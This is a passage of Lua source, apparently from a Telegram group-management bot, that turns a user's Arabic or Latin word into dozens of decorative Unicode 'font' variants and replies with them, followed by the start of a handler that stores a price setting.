"ض,صـﮩ๋͜‏ـ,قـﮩ๋͜‏ـ,فـﮩ๋͜‏ـ,غـﮩ๋͜‏ـ,؏ـﮩ๋͜‏ـ,هـﮩ๋͜‏ـ,خـﮩ๋͜‏ـ,حـﮩ๋͜‏ـ,جـﮩ๋͜‏ـ,شـﮩ๋͜‏ـ,سـﮩ๋͜‏ـ,ی,بـﮩ๋͜‏ـ,لّۣۗ,آِ,نْۛ,تٌۙ,ﻡِۙـ,چ,ظـﮩ๋͜‏ـۖۜ,طٌۗ,ﺯۖ,ږۙ,ڊْ,پ,ﯠۚ,ڪٌۘ,گ,ثٌّۜ,ژ,ﺫۗ,ئ,آِ  ,.,_",      
"ض,صـ᷈͟ـ,قـ᷈͟ـ,فـ᷈͟ـ,غـ᷈͟ـ,عـ᷈͟ـ,هـ᷈͟ـ,خـ᷈͟ـ,حـ᷈͟ـ,جـ᷈͟ـ,شـ᷈͟ـ,سـ᷈͟ـ,ی,بـ᷈͟ـ,لـ᷈͟ـ,ٲآٲ,نـ᷈͟ـ,تـ᷈͟ـ,مـ᷈͟ـ,چ,ظـ᷈͟ــ᷈͟ـ,طـ᷈͟ـ,ز,ر,د,پ,ﯠ,كـ᷈͟ـ,گ,ثـ᷈͟ـ,ژ,ذ,ئ,ٲآٲ  ,.,_",      
"ض,صـﮩ⃑ﮩ,قـﮩ⃑ﮩ,فـﮩ⃑ﮩ,غـﮩ⃑ﮩ,عـﮩ⃑ﮩ,هـﮩ⃑ﮩ,خـﮩ⃑ﮩ,حـﮩ⃑ﮩ,جـﮩ⃑ﮩ,شـﮩ⃑ﮩ,سـﮩ⃑ﮩ,ی,بـﮩ⃑ﮩ,لـﮩ⃑ﮩ,آ,نـﮩ⃑ﮩ,تـﮩ⃑ﮩ,مـﮩ⃑ﮩ,چ,ظـﮩ⃑ﮩـﮩ⃑ﮩ,طـﮩ⃑ﮩ,ڒ,ر,ډ,پ,ﯛ,كـﮩ⃑ﮩ,گ,ثـﮩ⃑ﮩ,ژ,ﮈ,ئ,آ  ,.,_",      
"ضًـٍـًہ,صًـ,ـقـ,ف,غً,عًـ,هہ,خِہ,حـ,جْـ,ڜـ,ڛً,ی,بہ,ل,آ,ہن,تہ,م,چ,ظٍـً,طٍـًہ,ز,ڑ,دٍ,پ,وُ,ـڪـ,گ,ثـ,ژ,ذٍ,ئ,آ  ,.,_",      
"ضہۣۗ,صہۣۗ,قَہۣۗـ,فُہۣۗ,غّہۣۗ,عَہۣۗ,هہۣۗ,خٌہۣۗ,حًہۣۗ,جَہۣۗ,شّہۣۗ,سہۣۗـ,ی,بّہۣۗـ,لًً,أ,نٌہۣۗـ,تُہۣۗ,مہۣۗ,چ,ظٌہۣۗ,طٌہۣۗـ,زُ,رُ,دُ,پ,وِ,كہۣۗ,گ,ثًہۣۗ,ژ,ذٌ,ئ,أ  ,.,_",      
"ض,صۭۣۣۖـ,قۭۣۣۖـ,فۭۣۣۖـ,غۭۣۣۖـ,غۭۣۣۖـ,هۭۣۣۖـ,خۭۣۣۖـ,حۭۣۣۖـ,جۭۣۣۖـ,شۭۣۣۖـ,سۭۣۣۖـ,ی,بۭۣۣۖـ,لۭۣۣۖـ,آ,نۭۣۣۖـ,تۭۣۣۖـ,مۭۣۣۖـ,چ,ظۭۣۣۖـۭۣۣۖـ,طۭۣۣۖـ,ز,ر,د,پ,ﯠ,كۭۣۣۖـ,گ,ثۭۣۣۖـ,ژ,ذ,ئ,آ  ,.,_",      
"ض,صـﮩـ,قـﮩـ,فـﮩـ,غـﮩـ,عـﮩـ,هـﮩـ,خـﮩـ,حـﮩـ,جـﮩـ,شـﮩـ,سـﮩـ,ی,بـﮩـ,لـﮩـ,ٲ,نـﮩـ,تـﮩـ,مـﮩـ,چ,ظـﮩــﮩـ,طـﮩـ,ز,ر,د,پ,و,ګ,گ,ثـﮩـ,ژ,ذ,ئ,ٲ,.,_",      
"ض,صـٰٰـۛۛۛ,قـٰٰـۛۛۛ,فـٰٰـۛۛۛ,غـٰٰـۛۛۛ,عـٰٰـۛۛۛ,هـٰٰـۛۛۛ,خـٰٰـۛۛۛ,حـٰٰـۛۛۛ,جـٰٰـۛۛۛ,شـٰٰـۛۛۛ,سـٰٰـۛۛۛ,ی,بـٰٰـۛۛۛ,لـٰٰـۛۛۛ,أ,نـٰٰـۛۛۛ,تـٰٰـۛۛۛ,مـٰٰـۛۛۛ,چ,ظـٰٰـۛۛۛـٰٰـۛۛۛ,طـٰٰـۛۛۛ,ز,ر,د,پ,و,ک,گ,ثـٰٰـۛۛۛ,ژ,ذ,ئ,أ  ,.,_",      
"ض,صـٰ۫ﹻ,قـٰ۫ﹻ,فـٰ۫ﹻ,غـٰ۫ﹻ,عـٰ۫ﹻ,هـٰ۫ﹻ,خـٰ۫ﹻ,حـٰ۫ﹻ,جـٰ۫ﹻ,شـٰ۫ﹻ,سـٰ۫ﹻ,ی,بـٰ۫ﹻ,لـٰ۫ﹻ,ٱ,نَـٰ۫ﹻ,تْـٰ۫ﹻ,مٌـٰ۫ﹻ,چ,ظٌـٰ۫ﹻـٰ۫ﹻ,طِـٰ۫ﹻ,زُ,رَ,دِ,پ,وَ,كِـٰ۫ﹻ,گ,ثُـٰ۫ﹻ,ژ,ذَ,ئ,ٱℓ  ,.,_",      
"ض,صہٰـ͢͡,قہٰـ͢͡,فہٰـ͢͡,غہٰـ͢͡,عہٰـ͢͡,هہٰـ͢͡,خہٰـ͢͡,حہٰـ͢͡,جہٰـ͢͡,شہٰـ͢͡,سہٰـ͢͡,ی,بہٰـ͢͡,لہٰـ͢͡,ا,نہٰـ͢͡,تہٰـ͢͡,مہٰـ͢͡,چ,ظہٰـ͢͡ہٰـ͢͡,طہٰـ͢͡,ز,ر,د,پ,و,كہٰـ͢͡,گ,ثہٰـ͢͡,ژ,ذ,ئ,ا  ,.,_",       }  
local result = {}   
i=0  
for k=1,#fonts do   
i=i+1   
local tar_font = fonts[i]:split(",")   
local text = hxouse   
local text = text:gsub("ض",tar_font[1])     
local text = text:gsub("ص",tar_font[2])     
local text = text:gsub("ق",tar_font[3])     
local text = text:gsub("ف",tar_font[4])     
local text = text:gsub("غ",tar_font[5])     
local text = text:gsub("ع",tar_font[6])     
local text = text:gsub("ه",tar_font[7])     
local text = text:gsub("خ",tar_font[8])     
local text = text:gsub("ح",tar_font[9])     
local text = text:gsub("ج",tar_font[10])     
local text = text:gsub("ش",tar_font[11])     
local text = text:gsub("س",tar_font[12])     
local text = text:gsub("ی",tar_font[13])     
local text = text:gsub("ب",tar_font[14])     
local text = text:gsub("ل",tar_font[15])     
local text = text:gsub("ا",tar_font[16])     
local text = text:gsub("ن",tar_font[17])     
local text = text:gsub("ت",tar_font[18])     
local text = text:gsub("م",tar_font[19])     
local text = text:gsub("چ",tar_font[20])     
local text = text:gsub("ظ",tar_font[21])     
local text = text:gsub("ط",tar_font[22])     
local text = text:gsub("ز",tar_font[23])     
local text = text:gsub("ر",tar_font[24])     
local text = text:gsub("د",tar_font[25])    
local text = text:gsub("پ",tar_font[26])     
local text = text:gsub("و",tar_font[27])     
local text = text:gsub("ک",tar_font[28])     
local text = text:gsub("گ",tar_font[29])     
local text = text:gsub("ث",tar_font[30])     
local text = text:gsub("ژ",tar_font[31])     
local text = text:gsub("ذ",tar_font[32])     
local text = text:gsub("ئ",tar_font[33])     
local text = text:gsub("آ",tar_font[34])      
table.insert(result, text)   
end   
local hxouse22 = "⌯︙ الكلمه "..hxouse.." \n⌯︙ تم زخرفتها {"..tostring(#fonts).."} نوع \n⌯︙ اضغط على الكلمه لنسخها \n\n"
number=0   
for v=1,#result do  
number=number+1   
local hxouse = { ' 🔥📥 ', '🔅🔥﴿', '  ❥˓  ', '💝﴿ֆ', '  🐼🧼', ' 🙊💙', '-🐥📥 ', ' 〄😻‘',' ⚡️', '- ⁽🌷', '🔥“', '💭', '', '🎩🍿','“̯ 🐼💗 ', '🐝🍷','❥̚͢₎ 🐣', '👄‘', ' 💭ۦ', ' 💛💭ۦ', ' ⚡️ۦ','℡ᴖ̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ 📥🐯⇣✦', '┇♩⁽💎🌩₎⇣✿','ۦٰ‏┋❥ ͢˓🦁💛ۦ‏', '⚡️♛ֆ₎', '♛⇣🐰☄️₎✦', '⁾⇣✿💖┇❥', ' ₎✿🎃 ┇“❥', '😴✿⇣', '❥┇⁽ ℡🦁' }   
hxouse22 = hxouse22..''..number.."  `"..result[number]..''..hxouse[math.random(#hxouse)].."`\n\n"    
end  
hxousedx(msg.chat_id_, 0, 1, hxouse22, 1, 'md') 
end 
end 
if hxousedx1:get(HXOUSE.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then       
local zakrf = text:match("(.*)")       
hxousedx1:del(HXOUSE.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_)         
if not text:find("[\216-\219][\128-\191]") then      
hxouse = zakrf     
local font_base = "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,9,8,7,6,5,4,3,2,1,.,_"     
local font_hash = "z,y,x,w,v,u,t,s,r,q,p,o,n,m,l,k,j,i,h,g,f,e,d,c,b,a,Z,Y,X,W,V,U,T,S,R,Q,P,O,N,M,L,K,J,I,H,G,F,E,D,C,B,A,0,1,2,3,4,5,6,7,8,9,.,_"     
local fonts = {            "Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1,.,_",     
"п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐,к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙۪۪,卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙,0,9,8,7,6,5,4,3,2,1,.,_",     
"ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,Գ,Ց,Դ,6,5,Վ,Յ,Զ,1,.,_",     
"a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k̷,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̲,̲B̲,̲C̲,̲D̲,̲E̲,̲F̲,̲G̲,̲H̲,̲I̲,̲J̲,̲K̲,̲L̲,̲M̲,̲N̲,̲O̲,̲P̲,̲Q̲,̲R̲,̲S̲,̲T̲,̲U̲,̲V̲,̲W̲,̲X̲,̲Y̲,̲Z̲,̲a̲,̲b̲,̲c̲,̲d̲,̲e̲,̲f̲,̲g̲,̲h̲,̲i̲,̲j̲,̲k̲,̲l̲,̲m̲,̲n̲,̲o̲,̲p̲,̲q̲,̲r̲,̲s̲,̲t̲,̲u̲,̲v̲,̲w̲,̲x̲,̲y̲,̲z̲,̲0̲,̲9̲,̲8̲,̲7̲,̲6̲,̲5̲,̲4̲,̲3̲,̲2̲,̲1̲,̲.̲,̲_̲",     
"Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆,K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,0,9,8,7,6,5,4,3,2,1,.,_",     
"۪۫a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,۪۫y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,۪۪۫۫,0۪۪۫۫,9۪۪۫۫,8۪۪۫۫,7۪۪۫۫,6۪۪۫۫,5۪۪۫۫,4۪۪۫۫,3۪۪۫۫,2۪۪۫۫,1۪۪۫۫,.۪۪۫۫,_",     
"͜͡Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,ؔؔ͜͜Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,͜͡0,9,8,7,6,5,4,3,2,1,.,_",     
"A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,̶̶A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     }         
local result = {}     
i=0     
for k=1,#fonts do     
i=i+1     
local tar_font = fonts[i]:split(",")     
local text = hxouse    
local text = text:gsub("A",tar_font[1])     
local text = text:gsub("B",tar_font[2])     
local text = text:gsub("C",tar_font[3])     
local text = text:gsub("D",tar_font[4])     
local text = text:gsub("E",tar_font[5])     
local text = text:gsub("F",tar_font[6])  
local text = text:gsub("G",tar_font[7])    
local text = text:gsub("H",tar_font[8])    
local text = text:gsub("I",tar_font[9])     
local text = text:gsub("J",tar_font[10])     
local text = text:gsub("K",tar_font[11])     
local text = text:gsub("L",tar_font[12])     
local text = text:gsub("M",tar_font[13])     
local text = text:gsub("N",tar_font[14])     
local text = text:gsub("O",tar_font[15])     
local text = text:gsub("P",tar_font[16])     
local text = text:gsub("Q",tar_font[17])     
local text = text:gsub("R",tar_font[18])     
local text = text:gsub("S",tar_font[19])     
local text = text:gsub("T",tar_font[20])     
local text = text:gsub("U",tar_font[21])     
local text = text:gsub("V",tar_font[22])     
local text = text:gsub("W",tar_font[23])     
local text = text:gsub("X",tar_font[24])     
local text = text:gsub("Y",tar_font[25])     
local text = text:gsub("Z",tar_font[26])     
local text = text:gsub("a",tar_font[27])     
local text = text:gsub("b",tar_font[28])     
local text = text:gsub("c",tar_font[29])     
local text = text:gsub("d",tar_font[30])     
local text = text:gsub("e",tar_font[31])     
local text = text:gsub("f",tar_font[32])     
local text = text:gsub("g",tar_font[33])     
local text = text:gsub("h",tar_font[34])     
local text = text:gsub("i",tar_font[35])     
local text = text:gsub("j",tar_font[36])     
local text = text:gsub("k",tar_font[37])     
local text = text:gsub("l",tar_font[38])     
local text = text:gsub("m",tar_font[39])     
local text = text:gsub("n",tar_font[40])     
local text = text:gsub("o",tar_font[41])     
local text = text:gsub("p",tar_font[42])     
local text = text:gsub("q",tar_font[43])     
local text = text:gsub("r",tar_font[44])     
local text = text:gsub("s",tar_font[45])     
local text = text:gsub("t",tar_font[46])     
local text = text:gsub("u",tar_font[47])     
local text = text:gsub("v",tar_font[48])     
local text = text:gsub("w",tar_font[49])     
local text = text:gsub("x",tar_font[50])     
local text = text:gsub("y",tar_font[51])     
local text = text:gsub("z",tar_font[52])     
local text = text:gsub("0",tar_font[53])     
local text = text:gsub("9",tar_font[54])     
local text = text:gsub("8",tar_font[55])     
local text = text:gsub("7",tar_font[56])     
local text = text:gsub("6",tar_font[57])     
local text = text:gsub("5",tar_font[58])     
local text = text:gsub("4",tar_font[59])     
local text = text:gsub("3",tar_font[60])     
local text = text:gsub("2",tar_font[61])     
local text = text:gsub("1",tar_font[62])            
table.insert(result, text)     
end     
local hxouse22 = "⌯︙ الكلمه "..hxouse.." \n⌯︙ تم زخرفتها {"..tostring(#fonts).."} نوع \n⌯︙ اضغط على الكلمه لنسخها \n\n"
number=0     
for v=1,#result do     
number=number+1     
local hxouse = { '🔥', '🔅﴿', '❥˓ ', '💝﴿', '🐼🧼', '🙊💙', '🐥📥', '😻‘','⚡️', '⁽🌷', '🔥“', '💭', '🍿','🐼💗 ', '🐝🍷','❥̚͢₎🐣', '👄‘', ' 💭ۦ',' 🎉ۦ', ' ⚡️ۦ','℡̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ 📥🐯⇣✦', '┇♩⁽💎🌩₎⇣✿','ٰ❥ ͢ۦ‏', '⚡️ֆ₎', '🐰☄️', '⁾❥', '✿🎃❥', '✿⇣', '❥℡🦁' }     
hxouse22 = hxouse22..''..number.."  `"..result[number]..''..hxouse[math.random(#hxouse)].."`\n\n"    
end     
hxousedx(msg.chat_id_, 0, 1, hxouse22, 1, 'md')     
end     
end 
---------------------------------------------HXOUSE TEAM----------------------------------------------------------
if hxousedx1:get(HXOUSE.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
hxousedx1:del(HXOUSE.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local nerkh = msg.content_.text_:match("(.*)")
hxousedx1:set(HXOUSE.."nerkh", nerkh)
if hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Bot *sudo* has been *Setted* ", 1, "md")
else
